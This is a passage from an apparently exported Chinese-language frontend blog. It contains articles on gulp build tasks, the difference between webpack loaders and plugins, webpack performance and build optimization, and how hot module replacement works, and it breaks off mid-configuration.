&#x27;src/&#x27;, &#x27;dist/&#x27;)\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        gulp.src(paths.srcPath)            .pipe(sourcemaps.init())            .pipe(minifycss())            .pipe(sourcemaps.write(&#x27;./&#x27;))            .pipe(gulp.dest(paths.distDir))    &#125;)&#125;)gulp.task(&#x27;default&#x27;, [&#x27;watchjs&#x27;,&#x27;watchcss&#x27;])\n\n7.6.2 gulp-autoprefixerautoprefixer 解析 CSS 文件并且添加浏览器前缀到CSS规则里。通过示例帮助理解\nautoprefixer 处理前：\n.demo &#123;    display:flex;&#125;\n\n\n\nautoprefixer 处理后：\n.demo &#123;    display:-webkit-flex;    display:-ms-flexbox;    display:flex;&#125;\n\n\n\n你只需要关心编写标准语法的 css，autoprefixer 会自动补全。\n在 watchcss 任务中加入 autoprefixer:\ngulp.task(&#x27;watchcss&#x27;, function () &#123;    gulp.watch(&#x27;src/css/**/*.css&#x27;, function (event) &#123;        var paths = watchPath(event, &#x27;src/&#x27;, &#x27;dist/&#x27;)\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        gulp.src(paths.srcPath)            .pipe(sourcemaps.init())            .pipe(autoprefixer(&#123;              browsers: &#x27;last 2 versions&#x27;            &#125;))            .pipe(minifycss())            .pipe(sourcemaps.write(&#x27;./&#x27;))            .pipe(gulp.dest(paths.distDir))    &#125;)&#125;)\n\n更多 autoprefixer 参数请查看 gulp-autoprefixer\n有时我们也需要一次编译所有 css 文件。可以配置 minifyss 任务。\ngulp.task(&#x27;minifycss&#x27;, function () &#123;    gulp.src(&#x27;src/css/**/*.css&#x27;)        .pipe(sourcemaps.init())        .pipe(autoprefixer(&#123;          browsers: &#x27;last 2 versions&#x27;        &#125;))        .pipe(minifycss())        .pipe(sourcemaps.write(&#x27;./&#x27;))        .pipe(gulp.dest(&#x27;dist/css/&#x27;))&#125;)\n\n在命令行输入 gulp minifyss 以压缩 src/css/ 下的所有 .css 文件并复制到 dist/css 目录下\n7.7 配置 Less 任务\n\n参考配置 JavaScript 任务的方式配置 less 任务\n\nvar less = require(&#x27;gulp-less&#x27;)gulp.task(&#x27;watchless&#x27;, function () &#123;    gulp.watch(&#x27;src/less/**/*.less&#x27;, function (event) &#123;        var paths = watchPath(event, &#x27;src/less/&#x27;, &#x27;dist/css/&#x27;)\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        var combined = combiner.obj([            gulp.src(paths.srcPath),            sourcemaps.init(),            autoprefixer(&#123;              browsers: &#x27;last 2 versions&#x27;            &#125;),            less(),            minifycss(),            sourcemaps.write(&#x27;./&#x27;),            gulp.dest(paths.distDir)        ])        combined.on(&#x27;error&#x27;, handleError)    &#125;)&#125;)gulp.task(&#x27;lesscss&#x27;, function () &#123;    var combined = combiner.obj([            gulp.src(&#x27;src/less/**/*.less&#x27;),            sourcemaps.init(),            autoprefixer(&#123;              browsers: &#x27;last 2 versions&#x27;            &#125;),            less(),            minifycss(),            sourcemaps.write(&#x27;./&#x27;),            gulp.dest(&#x27;dist/css/&#x27;)        ])    combined.on(&#x27;error&#x27;, handleError)&#125;)gulp.task(&#x27;default&#x27;, [&#x27;watchjs&#x27;, &#x27;watchcss&#x27;, &#x27;watchless&#x27;])\n\n7.8 配置 Sass 任务\n参考配置 JavaScript 任务的方式配置 Sass 任务\ngulp.task(&#x27;watchsass&#x27;,function () &#123;    gulp.watch(&#x27;src/sass/**/*&#x27;, function (event) &#123;        var paths = watchPath(event, &#x27;src/sass/&#x27;, &#x27;dist/css/&#x27;)\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        sass(paths.srcPath)            .on(&#x27;error&#x27;, function (err) &#123;                console.error(&#x27;Error!&#x27;, err.message);            &#125;)            .pipe(sourcemaps.init())            .pipe(minifycss())            .pipe(autoprefixer(&#123;              browsers: &#x27;last 2 versions&#x27;            &#125;))            .pipe(sourcemaps.write(&#x27;./&#x27;))            .pipe(gulp.dest(paths.distDir))    &#125;)&#125;)gulp.task(&#x27;sasscss&#x27;, function () &#123;        sass(&#x27;src/sass/&#x27;)        .on(&#x27;error&#x27;, function (err) &#123;            console.error(&#x27;Error!&#x27;, err.message);        &#125;)        .pipe(sourcemaps.init())        .pipe(minifycss())        .pipe(autoprefixer(&#123;          browsers: &#x27;last 2 versions&#x27;        &#125;))        .pipe(sourcemaps.write(&#x27;./&#x27;))        .pipe(gulp.dest(&#x27;dist/css&#x27;))&#125;)gulp.task(&#x27;default&#x27;, [&#x27;watchjs&#x27;, &#x27;watchcss&#x27;, &#x27;watchless&#x27;, &#x27;watchsass&#x27;, &#x27;watchsass&#x27;])\n\n7.9 配置 image 任务\nvar imagemin = require(&#x27;gulp-imagemin&#x27;)gulp.task(&#x27;watchimage&#x27;, function () &#123;    gulp.watch(&#x27;src/images/**/*&#x27;, function (event) &#123;        var paths = watchPath(event,&#x27;src/&#x27;,&#x27;dist/&#x27;)\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        gulp.src(paths.srcPath)            .pipe(imagemin(&#123;                progressive: true            &#125;))            .pipe(gulp.dest(paths.distDir))    &#125;)&#125;)gulp.task(&#x27;image&#x27;, function () &#123;    gulp.src(&#x27;src/images/**/*&#x27;)        .pipe(imagemin(&#123;            progressive: true        &#125;))        .pipe(gulp.dest(&#x27;dist/images&#x27;))&#125;)\n\n7.10 配置文件复制任务\n复制 src/fonts/ 文件到 dist/ 中\ngulp.task(&#x27;watchcopy&#x27;, function () &#123;    gulp.watch(&#x27;src/fonts/**/*&#x27;, function (event) &#123;        var paths = watchPath(event)\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        gulp.src(paths.srcPath)            .pipe(gulp.dest(paths.distDir))    &#125;)&#125;)gulp.task(&#x27;copy&#x27;, function () &#123;    gulp.src(&#x27;src/fonts/**/*&#x27;)        .pipe(gulp.dest(&#x27;dist/fonts/&#x27;))&#125;)gulp.task(&#x27;default&#x27;, [&#x27;watchjs&#x27;, &#x27;watchcss&#x27;, &#x27;watchless&#x27;, &#x27;watchsass&#x27;, &#x27;watchimage&#x27;, &#x27;watchcopy&#x27;])","categories":["前端工程化"],"tags":["glup"]},{"title":"webpack loader-plugin区别，自定义","url":"/2020/09/22/webpack/webpack%20loader-plugin%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%8C%E7%BC%96%E5%86%99/","content":"一、区别前面两节我们有提到Loader与Plugin对应的概念，先来回顾下\n\nloader 是文件加载器，能够加载资源文件，并对这些文件进行一些处理，诸如编译、压缩等，最终一起打包到指定的文件中\nplugin 赋予了 webpack 各种灵活的功能，例如打包优化、资源管理、环境变量注入等，目的是解决 loader 无法实现的其他事\n\n从整个运行时机上来看，如下图所示：\n\n可以看到，两者在运行时机上的区别：\n\nloader 运行在打包文件之前\nplugins 在整个编译周期都起作用\n\n在Webpack 运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过Webpack提供的 API改变输出结果\n对于loader，实质是一个转换器，将A文件进行编译形成B文件，操作的是文件，比如将A.scss或A.less转变为B.css，单纯的文件转换过程\n二、编写loader在编写 loader 前，我们首先需要了解 loader 的本质\n其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader设为一个箭头函数\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容\n函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息\n函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer\n代码如下所示：\n// 导出一个函数，source为webpack传递给loader的文件源内容module.exports = function(source) &#123;    const content = doSomeThing2JsString(source);        // 如果 loader 配置了 options 对象，那么this.query将指向 options    const options = this.query;        // 可以用作解析其他模块路径的上下文    console.log(&#x27;this.context&#x27;);        /*     * this.callback 参数：     * error：Error | null，当 loader 出错时向外抛出一个 error     * content：String | Buffer，经过 loader 编译后需要导出的内容     * sourceMap：为方便调试生成的编译后内容的 source map     * ast：本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST，进而省去重复生成 AST 的过程     */    this.callback(null, content); // 异步    return content; // 同步&#125;\n\n一般在编写loader的过程中，保持功能单一，避免做多种功能\n如less文件转换成 css文件也不是一步到位，而是 less-loader、css-loader、style-loader几个 loader的链式调用才能完成转换\n三、编写plugin由于webpack基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件，就可以在特定的阶段执行自己的插件任务\n在之前也了解过，webpack编译会创建两个核心对象：\n\ncompiler：包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和 webpack 整个生命周期相关的钩子\ncompilation：作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation 将被创建\n\n如果自己要实现plugin，也需要遵循一定的规范：\n\n插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问compiler实例\n传给每个插件的 compiler 和 compilation 对象都是同一个引用，因此不建议修改\n异步的事件需要在插件处理完任务时调用回调函数通知 Webpack 进入下一个流程，不然会卡住\n\n实现plugin的模板如下：\nclass MyPlugin &#123;    // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象  apply (compiler) &#123;    // 找到合适的事件钩子，实现自己的插件功能    compiler.hooks.emit.tap(&#x27;MyPlugin&#x27;, compilation =&gt; &#123;        // compilation: 当前打包构建流程的上下文        console.log(compilation);                // do something...    &#125;)  &#125;&#125;\n\n在 emit 事件发生时，代表源文件的转换和组装已经完成，可以读取到最终将输出的资源、代码块、模块及其依赖，并且可以修改输出资源的内容\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack优化前端性能","url":"/2020/10/09/webpack/webpack%20%E4%BC%98%E5%8C%96%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD/","content":"一、背景随着前端的项目逐渐扩大，必然会带来的一个问题就是性能\n尤其在大型复杂的项目中，前端业务可能因为一个小小的数据依赖，导致整个页面卡顿甚至奔溃\n一般项目在完成后，会通过webpack进行打包，利用webpack对前端项目性能优化是一个十分重要的环节\n二、如何优化通过webpack优化前端的手段有：\n\nJS代码压缩\nCSS代码压缩\nHtml文件代码压缩\n文件大小压缩\n图片压缩\nTree Shaking\n代码分离\n内联 chunk\n\nJS代码压缩terser是一个JavaScript的解释、绞肉机、压缩机的工具集，可以帮助我们压缩、丑化我们的代码，让bundle更小\n在production模式下，webpack 默认就是使用 TerserPlugin 来处理我们的代码的。如果想要自定义配置它，配置方法如下：\nconst TerserPlugin = require(&#x27;terser-webpack-plugin&#x27;)module.exports = &#123;    ...    optimization: &#123;        minimize: true,        minimizer: [            new TerserPlugin(&#123;                parallel: true // 电脑cpu核数-1            &#125;)        ]    &#125;&#125;\n\n属性介绍如下：\n\nextractComments：默认值为true，表示会将注释抽取到一个单独的文件中，开发阶段，我们可设置为 false ，不保留注释\nparallel：使用多进程并发运行提高构建的速度，默认值是true，并发运行的默认数量： os.cpus().length - 1\nterserOptions：设置我们的terser相关的配置：\ncompress：设置压缩相关的选项，mangle：设置丑化相关的选项，可以直接设置为true\nmangle：设置丑化相关的选项，可以直接设置为true\ntoplevel：底层变量是否进行转换\nkeep_classnames：保留类的名称\nkeep_fnames：保留函数的名称\n\nCSS代码压缩CSS压缩通常是去除无用的空格等，因为很难去修改选择器、属性的名称、值等\nCSS的压缩我们可以使用另外一个插件：css-minimizer-webpack-plugin\nnpm install css-minimizer-webpack-plugin -D\n\n配置方法如下：\nconst CssMinimizerPlugin = require(&#x27;css-minimizer-webpack-plugin&#x27;)module.exports = &#123;    // ...    optimization: &#123;        minimize: true,        minimizer: [            new CssMinimizerPlugin(&#123;                parallel: true            &#125;)        ]    &#125;&#125;\n\nHtml文件代码压缩使用HtmlWebpackPlugin插件来生成HTML的模板时候，通过配置属性minify进行html优化\nmodule.exports = &#123;    ...    plugin:[        new HtmlwebpackPlugin(&#123;            ...            minify:&#123;                minifyCSS:false, // 是否压缩css                collapseWhitespace:false, // 是否折叠空格                removeComments:true // 是否移除注释            &#125;        &#125;)    ]&#125;\n\n\n\n设置了minify，实际会使用另一个插件html-minifier-terser\n文件大小压缩对文件的大小进行压缩，减少http传输过程中宽带的损耗\nnpm install compression-webpack-plugin -D\n\nnew ComepressionPlugin(&#123;    test:/\\.(css|js)$/,  // 哪些文件需要压缩    threshold:500, // 设置文件多大开始压缩    minRatio:0.7, // 至少压缩的比例    algorithm:&quot;gzip&quot;, // 采用的压缩算法&#125;)\n\n图片压缩一般来说在打包之后，一些图片文件的大小是远远要比 js 或者 css 文件要来的大，所以图片压缩较为重要\n配置方法如下：\nmodule: &#123;  rules: [    &#123;      test: /\\.(png|jpg|gif)$/,      use: [        &#123;          loader: &#x27;file-loader&#x27;,          options: &#123;            name: &#x27;[name]_[hash].[ext]&#x27;,            outputPath: &#x27;images/&#x27;,          &#125;        &#125;,        &#123;          loader: &#x27;image-webpack-loader&#x27;,          options: &#123;            // 压缩 jpeg 的配置            mozjpeg: &#123;              progressive: true,              quality: 65            &#125;,            // 使用 imagemin**-optipng 压缩 png，enable: false 为关闭            optipng: &#123;              enabled: false,            &#125;,            // 使用 imagemin-pngquant 压缩 png            pngquant: &#123;              quality: &#x27;65-90&#x27;,              speed: 4            &#125;,            // 压缩 gif 的配置            gifsicle: &#123;              interlaced: false,            &#125;,            // 开启 webp，会把 jpg 和 png 图片压缩为 webp 格式            webp: &#123;              quality: 75            &#125;          &#125;        &#125;      ]    &#125;,  ]&#125; \n\nTree ShakingTree Shaking 是一个术语，在计算机中表示消除死代码，依赖于ES Module的静态语法分析（不执行任何的代码，可以明确知道模块的依赖关系）\n在webpack实现Trss shaking有两种不同的方案：\n\nusedExports：通过标记某些函数是否被使用，之后通过Terser来进行优化的\nsideEffects：跳过整个模块&#x2F;文件，直接查看该文件是否有副作用\n\n两种不同的配置方案， 有不同的效果\nusedExports配置方法也很简单，只需要将usedExports设为true\nmodule.exports = &#123;    ...    optimization:&#123;        usedExports    &#125;&#125;\n\n使用之后，没被用上的代码在webpack打包中会加入unused harmony export mul注释，用来告知 Terser 在优化时，可以删除掉这段代码\n如下面sum函数没被用到，webpack打包会添加注释，terser在优化时，则将该函数去掉\n\nsideEffectssideEffects用于告知webpack compiler哪些模块时有副作用，配置方法是在package.json中设置sideEffects属性\n如果sideEffects设置为false，就是告知webpack可以安全的删除未用到的exports\n如果有些文件需要保留，可以设置为数组的形式\n&quot;sideEffecis&quot;:[    &quot;./src/util/format.js&quot;,    &quot;*.css&quot; // 所有的css文件]\n\n上述都是关于javascript的tree shaking，css同样也能够实现tree shaking\ncss tree shakingcss进行tree shaking优化可以安装PurgeCss插件\nnpm install purgecss-plugin-webpack -D\n\nconst PurgeCssPlugin = require(&#x27;purgecss-webpack-plugin&#x27;)module.exports = &#123;    ...    plugins:[        new PurgeCssPlugin(&#123;            path:glob.sync(`$&#123;path.resolve(&#x27;./src&#x27;)&#125;/**/*`), &#123;nodir:true&#125;// src里面的所有文件            satelist:function()&#123;                return &#123;                    standard:[&quot;html&quot;]                &#125;            &#125;        &#125;)    ]&#125;\n\n\npaths：表示要检测哪些目录下的内容需要被分析，配合使用glob\n默认情况下，Purgecss会将我们的html标签的样式移除掉，如果我们希望保留，可以添加一个safelist的属性\n\n代码分离将代码分离到不同的bundle中，之后我们可以按需加载，或者并行加载这些文件\n默认情况下，所有的JavaScript代码（业务代码、第三方依赖、暂时没有用到的模块）在首页全部都加载，就会影响首页的加载速度\n代码分离可以分出出更小的bundle，以及控制资源加载优先级，提供代码的加载性能\n这里通过splitChunksPlugin来实现，该插件webpack已经默认安装和集成，只需要配置即可\n默认配置中，chunks仅仅针对于异步（async）请求，我们可以设置为initial或者all\nmodule.exports = &#123;    ...    optimization:&#123;        splitChunks:&#123;            chunks:&quot;all&quot;        &#125;    &#125;&#125;\n\nsplitChunks主要属性有如下：\n\nChunks，对同步代码还是异步代码进行处理\nminSize： 拆分包的大小, 至少为minSize，如何包的大小不超过minSize，这个包不会拆分\nmaxSize： 将大于maxSize的包，拆分为不小于minSize的包\nminChunks：被引入的次数，默认是1\n\n内联chunk可以通过InlineChunkHtmlPlugin插件将一些chunk的模块内联到html，如runtime的代码（对模块进行解析、加载、模块信息相关的代码），代码量并不大，但是必须加载的\nconst InlineChunkHtmlPlugin = require(&#x27;react-dev-utils/InlineChunkHtmlPlugin&#x27;)const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)module.exports = &#123;    ...    plugin:[        new InlineChunkHtmlPlugin(HtmlWebpackPlugin,[/runtime.+\\.js/]&#125;\n\n三、总结关于webpack对前端性能的优化，可以通过文件体积大小入手，其次还可通过分包的形式、减少http请求次数等方式，实现对前端性能的优化\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack 热加载原理","url":"/2020/09/30/webpack/webpack%20%E7%83%AD%E5%8A%A0%E8%BD%BD%E5%8E%9F%E7%90%86/","content":"一、是什么HMR全称 Hot Module Replacement，可以理解为模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用\n例如，我们在应用运行过程中修改了某个模块，通过自动刷新会导致整个应用的整体刷新，那页面中的状态信息都会丢失\n如果使用的是 HMR，就可以实现只将修改的模块实时替换至应用中，不必完全刷新整个应用\n在webpack中配置开启热模块也非常的简单，如下代码：\nconst webpack = require(&#x27;webpack&#x27;)module.exports = &#123;  // ...  devServer: &#123;    // 开启 HMR 特性    hot: true    // hotOnly: true  &#125;&#125;\n\n通过上述这种配置，如果我们修改并保存css文件，确实能够以不刷新的形式更新到页面中\n但是，当我们修改并保存js文件之后，页面依旧自动刷新了，这里并没有触发热模块\n所以，HMR并不像 Webpack 的其他特性一样可以开箱即用，需要有一些额外的操作\n我们需要去指定哪些模块发生更新时进行HRM，如下代码：\nif(module.hot)&#123;    module.hot.accept(&#x27;./util.js&#x27;,()=&gt;&#123;        console.log(&quot;util.js更新了&quot;)    &#125;)&#125;\n\n二、实现原理首先来看看一张图，如下：\n\n\nWebpack Compile：将 JS 源代码编译成 bundle.js\nHMR Server：用来将热更新的文件输出给 HMR Runtime\nBundle Server：静态资源文件服务器，提供文件访问路径\nHMR Runtime：socket服务器，会被注入到浏览器，更新文件的变化\nbundle.js：构建输出的文件\n在HMR Runtime 和 HMR Server之间建立 websocket，即图上4号线，用于实时更新文件变化\n\n上面图中，可以分成两个阶段：\n\n启动阶段为上图 1 - 2 - A - B\n\n在编写未经过webpack打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle文件，传输给Bundle Server 静态资源服务器\n\n更新阶段为上图 1 - 2 - 3 - 4\n\n当某一个文件或者模块发生变化时，webpack监听到文件变化对文件重新编译打包，编译生成唯一的hash值，这个hash值用来作为下一次热更新的标识\n根据变化的内容生成两个补丁文件：manifest（包含了 hash 和 chundId，用来说明变化的内容）和chunk.js 模块\n由于socket服务器在HMR Runtime 和 HMR Server之间建立 websocket链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的hash值，如下图的h属性，作为下一次热更细的标识\n\n在浏览器接受到这条消息之前，浏览器已经在上一次socket 消息中已经记住了此时的hash 标识，这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件\nmainfest文件包含重新build生成的hash值，以及变化的模块，对应上图的c属性\n浏览器根据 manifest 文件获取模块变化的内容，从而触发render流程，实现局部模块更新\n\n三、总结关于webpack热模块更新的总结如下：\n\n通过webpack-dev-server创建两个服务器：提供静态资源的服务（express）和Socket服务\nexpress server 负责直接提供静态资源的服务（打包后的资源直接被浏览器请求和解析）\nsocket server 是一个 websocket 的长连接，双方可以通信\n当 socket server 监听到对应的模块发生变化时，会生成两个文件.json（manifest文件）和.js文件（update chunk）\n通过长连接，socket server 可以直接将这两个文件主动发送给客户端（浏览器）\n浏览器拿到两个新的文件后，通过HMR runtime机制，加载这两个文件，并且针对修改的模块进行更新\n\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack性能优化","url":"/2020/10/04/webpack/webpack%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","content":"提升构建性能澄清：有时候我们会笼统的说webpack的性能提升，实际上webpack的性能提升可以分为两类  第一类是通过webpack来提升我们项目性能  如：网站的首屏到达时间，这个优化的受益者是c端的用户  ，2.提升webpack的构建编译性能，如：提高打包速度，降低打包时间，这个优化的受益者是我们的开发人员。   本章讲的是第二种把官网上提出的webpack5 提升构建性能的点  列：注意：  webpack 每个版本的优化点都是不一样的通用环境：这些优化既适用于开发化境也适用于生产环境。开发环境：生产环境：\n通用环境无论你是在 开发环境 还是在 生产环境 下运行构建脚本，以下最佳实践都会有所帮助。\n1、更新到最新版本使用最新的 webpack 版本。我们会经常进行性能优化。webpack 的最新稳定版本是：将 Node.js 更新到最新版本，也有助于提高性能。除此之外，将你的 package 管理工具（例如 npm 或者 yarn ）更新到最新版本，也有助于提高性能。较新的版本能够建立更高效的模块树以及提高解析速度。\n2、loader将 loader 应用于最少数量的必要模块。而非如下:\nmodule.exports = &#123; //... module: &#123;  rules: [  &#123;    test: /\\.js$/,    loader: &#x27;babel-loader&#x27;,  &#125;, ],&#125;,&#125;;\n通过使用 include 字段，仅将 loader 应用在实际需要将其转换的模块：\nconst path = require(&#x27;path&#x27;);module.exports = &#123; //... module: &#123;  rules: [  &#123;    test: /\\.js$/,    include: path.resolve(__dirname, &#x27;src&#x27;),    loader: &#x27;babel-loader&#x27;,  &#125;, ],&#125;,&#125;;\n3、引导(bootstrap)每个额外的 loader&#x2F;plugin 都有其启动时间。尽量少地使用工具。\n4、解析以下步骤可以提高解析速度：减少 resolve.modules , resolve.extensions , resolve.mainFiles ,resolve.descriptionFiles 中条目数量，因为他们会增加文件系统调用的次数。\n如果你不使用 symlinks（例如 npm link 或者 yarn link ），可以设置resolve.symlinks: false 。\n如果你使用自定义 resolve plugin 规则，并且没有指定 context 上下文，可以设置 resolve.cacheWithContext: false 。\n5、小即是快(smaller &#x3D; faster)减少编译结果的整体大小，以提高构建性能。尽量保持 chunk 体积小。使用数量更少&#x2F;体积更小的 library。\n在多页面应用程序中使用 SplitChunksPlugin 。在多页面应用程序中使用 SplitChunksPlugin ，并开启 async 模式。移除未引用代码。只编译你当前正在开发的那些代码。\n6、持久化缓存在 webpack 配置中使用 cache 选项。使用 package.json 中的 “postinstall”清除缓存目录。将 cache 类型设置为内存或者文件系统。 memory 选项很简单，它告诉 webpack在内存中存储缓存，不允许额外的配置：webpack.config.js\nmodule.exports = &#123; //... cache: &#123;  type: &#x27;memory&#x27;,&#125;,&#125;;\n7、自定义 plugin&#x2F;loader对它们进行概要分析，以免在此处引入性能问题。8、dll使用 DllPlugin 为更改不频繁的代码生成单独的编译结果。这可以提高应用程序的编译速度，尽管它增加了构建过程的复杂度。\nwebpack.all.config.js  配置关于dll相关的内容\nconst path = require(&#x27;path&#x27;)const webpack = require(&#x27;webpack&#x27;)module.exports = &#123;\tmode:&#x27;production&#x27;   // 在生产环境下面去做事情\tentry:&#123;\t\tjquery:[&#x27;jquery&#x27;],\t&#125;,  //注意：这个entry不是配置本地的包，而是要配置我们在node_modules里面安装的第三方的包\toutput:&#123;\t\tfilename:&#x27;[name].js&#x27;     // [name]  取到的是本身的jquery的chunk的名字\t\tpath:path.resolve(__dirname,&#x27;dll&#x27;),\t\tlibrary:&#x27;[name]_[hash]&#x27;    // 把他导出一个库    给这个包起了一个名字，打他导出一个第三方的包。\t&#125;,\tplugins:[\t\tnew webpack.DllPlugin(&#123;\t\t\tname:&#x27;[name]_[hash]&#x27;,     //名字和上面library取的名字是一样的\t\t\tpath:path.resolve(__dirname,&#x27;dll/manifest.json&#x27;)      // 把一个manifest的文件给生成出来\t\t&#125;)\t]&#125;package.json&#123;\t&quot;scripts&quot;:&#123;\t\t&quot;all&quot;:&quot;webpack --config ./webpack.dll.config.js&quot;\t&#125;&#125;webpack.config.jsconst webpack = require(&#x27;webpack&#x27;)const path = require(&#x27;path&#x27;)plugins:[\tnew webpack.DllReferencePlugin(&#123;\t\tmanifest:path.resolve(__dirname,&#x27;./all/manifest.json&#x27;)     // 它的值就是刚刚生成的manifest\t&#125;)    //和刚才的DllPlugin做了一个呼应]\n仅仅是提高了构建速度  如果想把jquery放到页面上显示的话还是有些问题的。   还需要对dll文件进行一次打包   可以使用插件来完成npm install add-asset-html-webpack-plugin -Dwebpack.config.js\nconst AddAssetHtmlPlugin = require(&#x27;add-asset-html-webpack-plugin&#x27;)plugins:[\tnew AddAssetHtmlPlugin(&#123;\t\tfilepath:path.resolve(__dirname,&#x27;./dll/jquery.js&#x27;),\t\tpublicPath:&#x27;./&#x27;\t&#125;)]\n编译大小有右边回来之前的大小，但是jquery会单独做成一个文件打出来，那我们可以在最后的时候在做一次打包，之前打包的时候可以使用dll这个所谓的link，实时上他还是通过link去加载的我们的jquery.js文件\n9、worker 池(worker pool)thread-loader 可以将非常消耗资源的 loader 分流给一个 worker pool。\n该怎么去测试worker pool  ，定义：它的实现原理就是我们可以把他定义在其他的loader前面然后把其他的loader放在另外一个worker pool的池里面去运行来提高我们的打包速度，其实就是把他放到另外一个cpu去运行了，来利用我们电脑的cpu。npm install thread-loader -D\nmodule:&#123;\trules:[\t\t&#123;\t\t\ttest:/\\.js$/,\t\t\texclude:/node_modules/,\t\t\tuse:[\t\t\t\t&#123;\t\t\t\t\tloader:&#x27;babel-loader&#x27;   //问了提高Babel-loader的打包速度可以把他放在 worker pool里运行（可以在单独的cpu里去运行）\t\t\t\toptions:&#123;\t\t\t\t\tpresets:[&#x27;@babel/preset-env&#x27;]   //这样他就可以解析我们js里面的一些es6的代码了\t\t\t\t\t&#125;\t\t\t\t&#125;,\t\t\t\t&#123;  // thread-loader启动需要大概耗费600ms的时间（有开销），这个loader对耗时非常打的loader有意义。\t\t\t\t\tloader:&#x27;thread-loader&#x27;,\t\t\t\t\toptions:&#123;\t\t\t\t\t\tworkers:2    // cpu的数量\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t]\t\t&#125;\t]&#125;\n\n不要使用太多的 worker，因为 Node.js 的 runtime 和 loader 都有启动开销。最小化 worker 和 mainprocess(主进程) 之间的模块传输。进程间通讯(IPC,inter process communication)是非常消耗资源的。\n10、Progress plugin将 ProgressPlugin 从 webpack 中删除，可以缩短构建时间。请注意，ProgressPlugin 可能不会为快速构建提供太多价值，因此，请权衡利弊再使用。\n开发环境1、代码压缩Webpack 默认使用的是 TerserWebpackPlugin，默认开启了多进程和缓存，构建时，你的项目中可以看到 terser 的缓存文件 node_modules&#x2F;.cache&#x2F;terser-webpack-plugin。2、抽离公共代码主要是配置 optimazation.splitChunks&#x2F;&#x2F;webpack.config.js\nmodule.exports = &#123;optimization: &#123;\t\t runtimeChunk: &#123;            name: &#x27;manifest&#x27;        &#125;，        splitChunks: &#123;//分割代码块            cacheGroups: &#123;                vendor: &#123;                    //第三方依赖                    priority: 1, //设置优先级，首先抽离第三方模块                    name: &#x27;vendor&#x27;,                    test: /node_modules/,                    chunks: &#x27;initial&#x27;,                    minSize: 0,                    minChunks: 1 //最少引入了1次                &#125;,                //缓存组                common: &#123;                    //公共模块                    chunks: &#x27;initial&#x27;,                    name: &#x27;common&#x27;,                    minSize: 100, //大小超过100个字节                    minChunks: 3 //最少引入了3次                &#125;            &#125;        &#125;    &#125;   &#125;\n\n\n\n以下步骤对于 开发环境 特别有帮助。1、增量编译使用 webpack 的 watch mode(监听模式)。而不使用其他工具来 watch 文件和调用webpack 。内置的 watch mode 会记录时间戳并将此信息传递给 compilation 以使缓存失效。\n在某些配置环境中，watch mode 会回退到 poll mode(轮询模式)。监听许多文件会导致 CPU 大量负载。在这些情况下，可以使用 watchOptions.poll 来增加轮询的间隔时间。\n2、在内存中编译下面几个工具通过在内存中（而不是写入磁盘）编译和 serve 资源来提高性能：\nwebpack-dev-serverwebpack-hot-middlewarewebpack-dev-middleware3、stats.toJson 加速webpack 4 默认使用 stats.toJson() 输出大量数据。除非在增量步骤中做必要的统计，否则请避免获取 stats 对象的部分内容。 webpack-dev-server 在 v3.1.3 以后的版本，包含一个重要的性能修复，即最小化每个增量构建步骤中，从 stats 对象获取的数据量。\n4、Devtool需要注意的是不同的 devtool 设置，会导致性能差异。\n“eval” 具有最好的性能，但并不能帮助你转译代码。如果你能接受稍差一些的 map 质量，可以使用 cheap-source-map 变体配置来提高性能使用 eval-source-map 变体配置进行增量编译。\n在大多数情况下，最佳选择是 eval-cheap-module-source-map 。\n5、避免在生产环境下才会用到的工具某些 utility, plugin 和 loader 都只用于生产环境。例如，在开发环境下使用TerserPlugin 来 minify(压缩) 和 mangle(混淆破坏) 代码是没有意义的。通常在开发环境下，应该排除以下这些工具：\nTerserPlugin[fullhash] &#x2F; [chunkhash] &#x2F; [contenthash]AggressiveSplittingPluginAggressiveMergingPluginModuleConcatenationPlugin\n6、最小化 entry chunkWebpack 只会在文件系统中输出已经更新的 chunk。某些配置选项（HMR,output.chunkFilename 的 [name] &#x2F; [chunkhash]&#x2F;[contenthash] ，[fullhash] ）来说，除了对已经更新的 chunk 无效之外，对于 entry chunk 也不会生效。确保在生成 entry chunk 时，尽量减少其体积以提高性能。下面的配置为运行时代码创建了一个额外的 chunk，所以它的生成代价较低：\nmodule.exports = &#123; // ... optimization: 